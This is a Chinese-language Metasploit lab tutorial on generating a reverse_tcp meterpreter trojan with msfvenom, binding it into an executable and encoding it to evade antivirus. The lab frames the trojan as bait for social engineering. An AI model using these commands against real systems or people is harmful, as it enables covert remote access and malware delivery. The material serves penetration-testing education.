# Metasploit 实现木马生成、捆绑及免杀  

## 一、实验简介  

在一次渗透测试的过程中，避免不了使用到社会工程学的方式来诱骗对方运行我们的木马或者点击我们准备好的恶意链接。木马的捆绑在社会工程学中是我们经常使用的手段，而为了躲避杀毒软件的查杀，我们又不得不对木马进行免杀处理。本次实验我们将学习如何通过Metasploit的msfvenom命令来生成木马、捆绑木马以及对木马进行免杀处理。  

## 实验环境  

Kali Linux  

## 知识点  

- msfvenom 如何生成木马  
- msfvenom 如何捆绑木马到常用软件  
- msfvenom 如何对木马进行编码免杀  

## 二、Metasploit介绍  

Metasploit是一个可用来发现、验证和利用漏洞的渗透测试平台，目前实验环境中Metasploit的版本是v4.12.23-dev包含了1577个exploits、907个auxiliary、272个post、455个payloads、39个encoders以及8个nops。  

其中exploits是漏洞利用模块(也叫渗透攻击模块)，auxiliary是辅助模块，post是后渗透攻击模块，payloads是攻击载荷也就是我们常说的shellcode，这里生成的木马其实就是payloads。  

在本次试验中我们主要使用的是msfpayload（攻击荷载生成器），msfencoder（编码器）的替代品msfvenom，msfvenom集成了前两者的全部功能，可以生成payload（本节所说的木马）以及对payload编码免杀和避免坏字符、捆绑木马等。在Kali Linux中默认安装了Metasploit framework 我们可以直接使用。  

## 三、实验环境启动  

实验楼中已经配置好了 Kali Linux虚拟机的实验环境，无需再次安装，这里我简单介绍一下如何启动实验楼环境中的两台虚拟机，详细介绍请查看Kali 实验环境介绍与使用。  

攻击机：Kali Linux 2.0 虚拟机，主机名是 kali，IP 地址为 192.168.122.101，默认用户名和密码为 root/toor。  

靶机：Metasploitable2 虚拟机，主机名是 target，IP 地址为 192.168.122.102，默认用户名和密码为 msfadmin/msfadmin。  

本次实验我们只用到 Kali linux 虚拟机。  

我们先来查看当前环境虚拟机的列表和状态：  

```
$ sudo virsh list --all
```

因环境中虚拟机太慢，这里采用 docker 容器。进入 kali linux 系统的方式如下：  

```
$ docker run -ti --network host 3f457 bash
```

## 四、生成木马  

在进行木马生成实验之前我们先来学习一下msfvenom命令的用法。在 Kali linux 下输入如下命令,可以看到msfvenom的命令行选项。  

```
$ cd /usr/bin
$ ./msfvenom -h
```

这里我整理了帮助信息，方便我们查看本次实验要使用的命令：  

```
Options:
    -p, --payload       <payload>    Payload to use. Specify a '-' or stdin to use custom payloads
        --payload-options            List the payload's standard options
    -l, --list          [type]       List a module type. Options are: payloads, encoders, nops, all
    -n, --nopsled       <length>     Prepend a nopsled of [length] size on to the payload
    -f, --format        <format>     Output format (use --help-formats for a list)
        --help-formats               List available formats
    -e, --encoder       <encoder>    The encoder to use
    -a, --arch          <arch>       The architecture to use
        --platform      <platform>   The platform of the payload
        --help-platforms             List available platforms
    -s, --space         <length>     The maximum size of the resulting payload
        --encoder-space <length>     The maximum size of the encoded payload (defaults to the -s value)
    -b, --bad-chars     <list>       The list of characters to avoid example: '\x00\xff'
    -i, --iterations    <count>      The number of times to encode the payload
    -c, --add-code      <path>       Specify an additional win32 shellcode file to include
    -x, --template      <path>       Specify a custom executable file to use as a template
    -k, --keep                       Preserve the template behavior and inject the payload as a new thread
    -o, --out           <path>       Save the payload
    -v, --var-name      <name>       Specify a custom variable name to use for certain output formats
        --smallest                   Generate the smallest possible payload
    -h, --help                       Show this message
```

这里我们主要用到-p、-f和-o选项，下面我们分别来介绍一下它们的含义及用法。  

- -p选项：用来指定需要使用的payload,可以指定'-'或者stdin来自定义payload。如果不知道payload都包括哪些选项可以使用--payload-options列出payload的标准选项。

- -f选项：用来指定payload的输出格式，可以使用--help-formats来列出可选的格式。

- -o选项：用来指定输出的payload的保存路径，这里我们也可以采用重定向的方式来替代-o选项。  

在生成木马之前我们先使用-l选项来列出指定模块的所有可用资源(模块类型包括: payloads, encoders, nops, all)。这里我们指定payloads模块来查看都有哪些可用的木马。  

```
$ msfvenom -l payloads
```

根据上面各个选项的解释，现在我们就用选择好的payload来生成linux下的木马程序吧！输入命令如下：  

```
$ msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.122.101 -f elf -o /root/payload.elf
```

命令执行完毕后木马就生成了，在上面的命令中我们使用-p选项指定了payload并设置了监听主机的ip地址，由于默认这个payload设置监听端口为4444,所以我们这里没有设置监听端口，需要更改监听端口可以设置LPORT参数。  

是不是很简单，这样我们就成功的生成了一个木马。Metasploit中还有很多Payload提供我们使用，可以根据实际情况进行选择。  

## 五、捆绑木马  

通常我们生成了木马之后，要运用社会工程学的攻击方式诱骗目标运行我们的木马程序，否则我们的木马只是玩具罢了，记住：“没人运行的木马不是好木马”。这里我们就来学习一下如何将木马捆绑到一个常用的应用程序上，这样我们就可以上传到某些地方来诱骗目标下载并运行我们的木马程序(记住不要拿这个来做坏事，我们要做个正直的白帽子)。  

捆绑木马我们还是使用上面提到的msfvenom命令，只不过这里我们要用到一个新的命令行选项-x。我们来看一下-x选项的用法及含义。  

- -x选项：允许我们指定一个自定义的可执行文件作为模板，也就是将木马捆绑到这个可执行文件上。  

知道了这个选项之后，聪明的同学可能知道该怎么做了，现在就跟着我一起实验一下吧！  

为了方便演示，我们就将上一节生成的木马当做常用应用程序来捆绑木马。  

```
$ msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.122.101 -f elf -x /root/payload.elf -o /root/payload_backdoor.elf
```

还以为多麻烦的木马捆绑，就被Metasploit中的一个工具轻松解决了？没错，Metasploit就是这么强大！  

## 六、木马免杀  

虽然我们已经准备好了木马程序，并且也捆绑到了常用的应用程序上，但是现在杀毒软件泛滥，不经过免杀就算成功上传到目标主机，估计还没等运行就被杀掉了。这里用msfvenom生成木马同时对payload编码来实现木马的简单免杀。我们先来学习一下我们要用到的命令选项:  

- -e选项：用来指定要使用的编码器。  
- -i选项：用来指定对payload编码的次数。  

```
$ msfvenom -l encoders
```

这里我们挑选一个免杀效果比较好的编码器x86/shikata_ga_nai，进行编码：  

```
$ cd /usr/share
$ msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.122.101 -e x86/shikata_ga_nai -i 5 -f elf -o /root/payload_encoder.elf
```

从图中我们可以看到完成了对木马的5次编码，这样木马基本上就可以躲避部分杀毒软件的查杀，其实还可以对木马程序进行多次编码，虽然可以提高木马的免杀几率，不过可能会导致木马程序不可用。当然要想免杀效果更好就需要使用Metasploit pro版本或者给木马加壳、修改木马的特征码等等，不过要想躲过全部杀毒软件的查杀则会有些难度，通常会针对某个杀毒软件进行免杀。由于其他方法不在本次实验讨论范围之内，所以这里就不再赘述。  







